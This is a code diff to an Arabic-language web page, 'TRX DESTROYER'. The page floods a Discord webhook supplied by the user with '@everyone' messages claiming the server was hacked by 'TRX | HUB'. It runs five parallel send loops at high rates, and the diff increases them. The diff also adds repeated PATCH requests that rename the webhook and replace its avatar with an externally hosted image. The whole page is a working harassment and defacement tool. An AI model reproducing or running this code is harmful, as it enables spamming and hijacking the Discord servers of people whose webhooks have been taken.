@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☣️ TRX ☣️ · DESTROYER</title>
+    <title>TRX ☣️ · DESTROYER</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -60,7 +60,7 @@
 <body>
 <div class="box">
     <h1>☠️ TRX</h1>
-    <p class="sub">● @everyone + اسم البوت TRX ☣️ ●</p>
+    <p class="sub">● @everyone + اسم TRX ☣️ + صوره ●</p>
     <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/...">
     <div class="row">
         <button class="b1" id="go" onclick="START()">💀 ابدأ</button>
@@ -85,6 +85,9 @@ function log(msg) {
 }
 
 
+const AVATAR_URL = 'https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
+
+
 async function sendMsg(wh, text) {
     if (stopped) return;
     try {
@@ -93,69 +96,79 @@ async function sendMsg(wh, text) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 content: text,
-                username: 'TRX ☣️'     
+                username: 'TRX ☣️',
+                avatar_url: AVATAR_URL   
             })
         });
         sent++;
         $('cnt').textContent = sent;
-    } catch (e) {
-  
-    }
+    } catch (e) {}
 }
 
-
-async function renameBot(wh) {
+async function renameAndAvatarBot(wh) {
     if (stopped) return;
     try {
         const r = await fetch(wh, {
             method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name: 'TRX ☣️' })
+            body: JSON.stringify({
+                name: 'TRX ☣️',
+                avatar: AVATAR_URL   
+            })
         });
         if (r.ok) {
-            log('✅ PATCH: تم تغيير اسم الويب هوك → TRX ☣️');
+            log('✅ PATCH: تم تغيير الاسم + الصورة للويب هوك');
         } else {
-            const errText = await r.text().catch(() => 'غير معروف');
-            log(`❌ PATCH فشل - الحالة: ${r.status} - ${errText.slice(0, 60)}`);
+            const errText = await r.text().catch(() => '');
+            log(`❌ PATCH فشل (${r.status}) - ${errText.slice(0, 60)}`);
+            log('⚠️ لكن كل رسالة تطلع بالاسم والصورة المطلوبة');
         }
     } catch (e) {
-        log(`❌ PATCH خطأ CORS: ${e.message}. استعمل username في الرسائل بدلاً عنه`);
+        log(`⚠️ PATCH CORS: ${e.message}. كل رسالة فيها الاسم TRX ☣️ والصورة`);
     }
 }
 
 
+
 function loop1(wh, txt) {
     if (stopped) return;
-    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
+    for (let i = 0; i < 25; i++) sendMsg(wh, txt);
     const t = setTimeout(() => loop1(wh, txt), 100);
     allTimers.push(t);
 }
 
 function loop2(wh, txt) {
     if (stopped) return;
-    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
+    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
     const t = setTimeout(() => loop2(wh, txt), 150);
     allTimers.push(t);
 }
 
 function loop3(wh, txt) {
     if (stopped) return;
-    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
+    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
     const t = setTimeout(() => loop3(wh, txt), 200);
     allTimers.push(t);
 }
 
 function loop4(wh, txt) {
     if (stopped) return;
-    for (let i = 0; i < 10; i++) sendMsg(wh, txt);
+    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
     const t = setTimeout(() => loop4(wh, txt), 80);
     allTimers.push(t);
 }
 
-function nameLoop(wh) {
+function loop5(wh, txt) {
     if (stopped) return;
-    renameBot(wh);
-    const t = setTimeout(() => nameLoop(wh), 5000);
+    for (let i = 0; i < 30; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => loop5(wh, txt), 120);
+    allTimers.push(t);
+}
+
+function patchLoop(wh) {
+    if (stopped) return;
+    renameAndAvatarBot(wh);
+    const t = setTimeout(() => patchLoop(wh), 5000);
     allTimers.push(t);
 }
 
@@ -173,17 +186,18 @@ function START() {
     $('stp').disabled = false;
     $('log').value = '';
 
-    log('🚀 بدء الهجوم — TRX ☣️');
-    log('📌 كل رسالة تطلع باسم TRX ☣️');
+    log('🚀 بدء الهجوم — TRX ☣️ DESTROYER');
+    log('📌 الاسم: TRX ☣️');
+    log('📌 الصورة: MR-HUB');
     log('⚠️  ما يوقف إلا إذا ضغطت إيقاف');
 
     const msg = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @everyone';
-
     loop1(wh, msg);
     loop2(wh, msg);
     loop3(wh, msg);
     loop4(wh, msg);
-    nameLoop(wh);
+    loop5(wh, msg);
+    patchLoop(wh);
 
     const report = setInterval(() => {
         if (stopped) { clearInterval(report); return; }
@@ -191,8 +205,8 @@ function START() {
     }, 5000);
     allTimers.push(report);
 
-    log('⚡ أول محاولة PATCH لتغيير اسم الويب هوك...');
-    renameBot(wh);
+
+    setTimeout(() => renameAndAvatarBot(wh), 500);
 }
 
 function STOP() {
